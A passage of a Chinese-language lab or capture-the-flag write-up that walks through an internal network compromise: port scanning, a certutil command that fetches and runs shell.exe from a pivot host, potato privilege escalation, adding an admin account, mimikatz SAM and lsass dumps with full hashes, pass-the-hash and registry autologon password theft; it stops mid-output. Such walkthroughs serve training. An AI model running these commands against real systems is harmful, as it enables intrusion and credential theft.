<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mail<span class="literal">-svc</span>@webserver:/tmp<span class="variable">$</span> ./fscan <span class="literal">-h</span> <span class="number">172.16</span>.<span class="number">36.21</span></span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 暴力破解线程数: 1</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 开始信息扫描</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 最终有效主机数量: 1</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 开始主机扫描</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 有效端口数量: 233</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [SUCCESS] 端口开放 172.16.36.21:139</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [SUCCESS] 端口开放 172.16.36.21:3306</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [SUCCESS] 端口开放 172.16.36.21:135</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [SUCCESS] 端口开放 172.16.36.21:445</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:59] [SUCCESS] 服务识别 172.16.36.21:139 =&gt;  Banner:[.]</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:59] [SUCCESS] 服务识别 172.16.36.21:445 =&gt; </span></span><br><span class="line"><span class="string">[2025-07-08 18:12:06] [SUCCESS] 服务识别 172.16.36.21:3306 =&gt;  Banner:[!.#08S01Got packets out of order]</span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [SUCCESS] 服务识别 172.16.36.21:135 =&gt; </span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [INFO] 存活端口数量: 4</span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [INFO] 开始漏洞扫描</span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [INFO] 加载的插件: findnet, ms17010, mysql, netbios, smb, smb2, smbghost</span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [SUCCESS] NetBios 172.16.36.21    AOSELUAUTO\ASLITPC03          </span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [SUCCESS] NetInfo 扫描结果</span></span><br><span class="line"><span class="string">目标主机: 172.16.36.21</span></span><br><span class="line"><span class="string">主机名: ASLITPC03</span></span><br><span class="line"><span class="string">发现的网络接口:</span></span><br><span class="line"><span class="string">   IPv4地址:</span></span><br><span class="line"><span class="string">      └─ 172.16.36.21</span></span><br><span class="line"><span class="string">[2025-07-08 18:20:58] [SUCCESS] 扫描已完成: 7/7</span></span><br></pre></td></tr></table></figure>





<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Extranet <span class="number">172.16</span>.<span class="number">53.30</span>  已拿下  反序列化打内存马 cve<span class="literal">-2025-32463</span></span><br><span class="line">ASLITPC03 <span class="number">172.16</span>.<span class="number">36.21</span>   </span><br><span class="line">ASLSRVFS02 <span class="number">172.16</span>.<span class="number">34.23</span></span><br><span class="line">ASLSRVAD05 <span class="number">172.16</span>.<span class="number">34.5</span>  DC</span><br></pre></td></tr></table></figure>

<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><h4 id="jar反编译"><a href="#jar反编译" class="headerlink" title="jar反编译"></a>jar反编译</h4><p>扫到有mysql端口，还有源码</p>
<p>我们代码审计获得mysql账号密码</p>
<p>前面用jd-gui没搜到</p>
<p>还是idea好用，比较清晰</p>
<p>具体打开步骤就不放了</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/21.png"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.driver<span class="literal">-class-name</span>=com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.datasource.url=jdbc:mysql://<span class="number">172.16</span>.<span class="number">52.45</span>:<span class="number">3306</span>/maildb?characterEncoding=utf<span class="literal">-8</span>&amp;useUnicode=true&amp;serverTimezone=UTC</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=T%b8ds*l3v+B</span><br></pre></td></tr></table></figure>



<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/22.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/23.png"></p>
<p>拿下</p>
<h4 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h4><p>那么我们先上线吧</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/24.png"></p>
<p>机器不出网，但是内网可以通讯，这里注意，存放的本地路径最好不要带空格（否则会影响运行）</p>
<p>还可以在navicat执行命令，会流畅一点，这里太卡了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">172.16</span>.<span class="number">53.30</span>:<span class="number">80</span>/shell.exe C:/Users/Public/shell.exe</span><br></pre></td></tr></table></figure>



<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/25.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/26.png"></p>
<p>然后运行该程序</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/shell.exe</span><br></pre></td></tr></table></figure>



<p>就成功上线了</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/27.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/28.png"></p>
<p>这里明明可以土豆提权的，但是就是不成功</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/29.png"></p>
<p>最后还是使用godpotato成功提权</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/30.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/31.png"></p>
<p>接下来 我们继续打其他的主机</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Extranet <span class="number">172.16</span>.<span class="number">53.30</span>  已拿下  反序列化打内存马 cve<span class="literal">-2025-32463</span></span><br><span class="line">ASLITPC03 <span class="number">172.16</span>.<span class="number">36.21</span>   已拿下  mysql udf potato提权</span><br><span class="line">ASLSRVFS02 <span class="number">172.16</span>.<span class="number">34.23</span></span><br><span class="line">ASLSRVAD05 <span class="number">172.16</span>.<span class="number">34.5</span>  DC</span><br></pre></td></tr></table></figure>





<h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public\tmp&gt;net user Hundredsu qwer123! /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Public\tmp&gt;net localgroup administrators Hundredsu /add</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>



<p>rdp上去好操作些</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Hundredsu\Desktop\x64&gt;net time /domain</span><br><span class="line">Current time at \\ASLSRVAD05.aoseluauto.com is <span class="number">7</span>/<span class="number">8</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">55</span>:<span class="number">14</span> PM</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>









<p>读取sam获取hash（其他方法报错）</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/32.png"></p>
<p>一开始以为是这个问题，一直试都没成功</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Hundredsu\Desktop\x64&gt;mimikatz.exe <span class="string">&quot;lsadump::sam&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::sam</span></span><br><span class="line">Domain : ASLITPC03</span><br><span class="line">SysKey : <span class="number">1</span>c1d48aedd972a736190a9d7ad6372f1</span><br><span class="line">Local SID : S<span class="literal">-1-5-21-3910597396-2766426005-48596025</span></span><br><span class="line"></span><br><span class="line">SAMKey : aa660572728ee137643c2f81e02693c4</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f4 (<span class="number">500</span>)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: d41d2c4614bf18fa34726d4c1ba69fc2</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : ad91da6da89ad2e12bad94f34d7bd7d2</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : WIN<span class="literal">-1FDC75TLQPRAdministrator</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5_nt    (<span class="number">4096</span>) : <span class="number">1536102263</span>bc27d1b3c13b188715a912ce4747ca460ee1630dddd746c1b08ea5</span><br><span class="line">      unknow            (<span class="number">4096</span>) : <span class="number">88172</span>a4be5167d9c154c3a6f473da3f2</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">05</span>fad896627657ffd593f8a3112079cd308c787846dfc4dcf2a1efcc38c44044</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">96</span>acfc5f83c4585559cdfe8e34b2489d</span><br><span class="line">      rc4_hmac_nt       (<span class="number">4096</span>) : d41d2c4614bf18fa34726d4c1ba69fc2</span><br><span class="line">    ServiceCredentials</span><br><span class="line">      des_cbc_md5_nt    (<span class="number">4096</span>) : <span class="number">1536102263</span>bc27d1b3c13b188715a912ce4747ca460ee1630dddd746c1b08ea5</span><br><span class="line">      unknow            (<span class="number">4096</span>) : <span class="number">88172</span>a4be5167d9c154c3a6f473da3f2</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">05</span>fad896627657ffd593f8a3112079cd308c787846dfc4dcf2a1efcc38c44044</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">96</span>acfc5f83c4585559cdfe8e34b2489d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f5 (<span class="number">501</span>)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f7 (<span class="number">503</span>)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f8 (<span class="number">504</span>)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: <span class="number">4</span>bf0ee8fd1cc326bb824ecfd02235086</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">7</span>c6a36b8522c6075c5ada89d87d1ec2b</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : f76f23dbaafe66d7cf8a42cee7911f1e2f90865c4bb1d1f085ac34e47887facf</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">871422</span>be7656216911212d113ef5c75d</span><br><span class="line">      rc4_hmac_nt       (<span class="number">4096</span>) : <span class="number">4</span>bf0ee8fd1cc326bb824ecfd02235086</span><br><span class="line">    ServiceCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : f76f23dbaafe66d7cf8a42cee7911f1e2f90865c4bb1d1f085ac34e47887facf</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">871422</span>be7656216911212d113ef5c75d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>e8 (<span class="number">1000</span>)</span><br><span class="line">User : Hundredsu</span><br><span class="line">  Hash NTLM: <span class="number">72</span>d98c440b25ce7b05d81233044c020c</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">84</span>bf95fe1d8b236e4c9c75847e8176bf</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">72</span>d98c440b25ce7b05d81233044c020c</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">897</span>ddb49d329b92a806b9981dda39c6c</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : ASLITPC03.AOSELUAUTO.COMHundredsu</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5_nt    (<span class="number">4096</span>) : <span class="number">88</span>d6360e371965d5d3b613571d7e51ca1d70d83a030744deb3d5addbc59e3047</span><br><span class="line">      unknow            (<span class="number">4096</span>) : <span class="number">40</span>f0e1a4c2561a193bebeec1e57479ec</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">18</span>cda8a4f456a95f166ba225066404730067d76c9afe14bffb51f6cad8328b28</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">90</span>ff1329a9aa768508b8783bbc1eb57b</span><br><span class="line">      rc4_hmac_nt       (<span class="number">4096</span>) : <span class="number">72</span>d98c440b25ce7b05d81233044c020c</span><br><span class="line">    ServiceCredentials</span><br><span class="line">      des_cbc_md5_nt    (<span class="number">4096</span>) : <span class="number">88</span>d6360e371965d5d3b613571d7e51ca1d70d83a030744deb3d5addbc59e3047</span><br><span class="line">      unknow            (<span class="number">4096</span>) : <span class="number">40</span>f0e1a4c2561a193bebeec1e57479ec</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">18</span>cda8a4f456a95f166ba225066404730067d76c9afe14bffb51f6cad8328b28</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">90</span>ff1329a9aa768508b8783bbc1eb57b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>





<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py aoseluauto.com/Administrator@<span class="number">172.16</span>.<span class="number">36.21</span> <span class="literal">-hashes</span> :d41d2c4614bf18fa34726d4c1ba69fc2 <span class="literal">-just-dc-ntlm</span></span><br></pre></td></tr></table></figure>

<p>没成功</p>
<h4 id="SharpHound信息收集"><a href="#SharpHound信息收集" class="headerlink" title="SharpHound信息收集"></a>SharpHound信息收集</h4><p>使用SharpHound信息收集一下，要注意版本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe <span class="literal">-c</span> all</span><br></pre></td></tr></table></figure>



<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/33.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/34.png"></p>
<p>那么接下来我们要获取到SVC_MOMADM01的hash</p>
<p>由于系统问题，一直抓取不到hash，那么各种方法都试了一下</p>
<h4 id="远程密码获取-Procdump-Mimikatz（没成功）"><a href="#远程密码获取-Procdump-Mimikatz（没成功）" class="headerlink" title="远程密码获取-Procdump+Mimikatz（没成功）"></a><font style="color:rgb(0, 0, 0);">远程密码获取-Procdump+Mimikatz（没成功）</font></h4><p>使用<font style="color:rgb(0, 0, 0);">Procdump+Mimikatz的方法</font></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</span><br><span class="line">procdump64.exe <span class="literal">-accepteula</span> <span class="literal">-ma</span> lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">将lsass.dmp下载到本地后，然后执行mimikatz:</span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为了方便复制与查看，可以输出到本地文件里面：</span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt</span><br></pre></td></tr></table></figure>



<p>也还是报一样的错</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rcxeh80Avd9uOCl1brRpSw">https://mp.weixin.qq.com/s/rcxeh80Avd9uOCl1brRpSw</a></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/35.png"></p>
<p>下了最新版还是不行</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BcbwNer-Qsm-IVOpvsmfIw">https://mp.weixin.qq.com/s/BcbwNer-Qsm-IVOpvsmfIw</a></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/36.png"></p>
<p>是上述的原因，但是机子关了，就没有使用下面的mimikatz抓密码了</p>
<p>下面这个</p>
<p>通过网盘分享的文件：mimikatz.zip链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12Haf0i0VI0NWeI3oTpiqFQ?pwd=h7dk">https://pan.baidu.com/s/12Haf0i0VI0NWeI3oTpiqFQ?pwd=h7dk</a> 提取码: h7dk –来自百度网盘超级会员v4的分享</p>
<p>想直接mimikatz打pth开个cmd的，没成功</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:<span class="number">172.16</span>.<span class="number">36.21</span> /ntlm:d41d2c4614bf18fa34726d4c1ba69fc2</span><br></pre></td></tr></table></figure>



<h4 id="autologin的配置"><a href="#autologin的配置" class="headerlink" title="autologin的配置"></a>autologin的配置</h4><p>发现路走歪了</p>
<p>信息收集没做全</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v AutoAdminLogon</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    AutoAdminLogon    REG_SZ    <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultPassword</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    DefaultPassword    REG_SZ    DROCV4?LtyCp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultUsername</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    DefaultUsername    REG_SZ    EthanMorris</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultDomain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ERROR: The system was unable to find the specified registry key or value.</span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultDomainName</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    DefaultDomainName    REG_SZ    aoseluauto.com</span><br></pre></td></tr></table></figure>



<p>可以获取到EthanMorris的账密</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/37.png"></p>
<p>查看一下对哪些文件可以观看</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> nxc smb <span class="number">172.16</span>.<span class="number">34.23</span> <span class="literal">-u</span> EthanMorris <span class="literal">-p</span> <span class="string">&#x27;DROCV4?LtyCp&#x27;</span> <span class="literal">--shares</span></span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Hundredsu)-[~]</span><br><span class="line">└─<span class="comment"># proxychains4 -q nxc smb 172.16.34.23 -u EthanMorris -p &#x27;DROCV4?LtyCp&#x27; --shares</span></span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [*] Windows <span class="number">10</span> / Server <span class="number">2019</span> Build <span class="number">17763</span> x64 (name:ASLSRVFS02) (domain:aoseluauto.com) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [+] aoseluauto.com\EthanMorris:DROCV4?LtyCp</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [*] Enumerated shares</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       Share           Permissions     Remark</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       <span class="literal">-----</span>           <span class="literal">-----------</span>     <span class="literal">------</span></span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       ADMIN<span class="variable">$</span>                          Remote Admin</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span 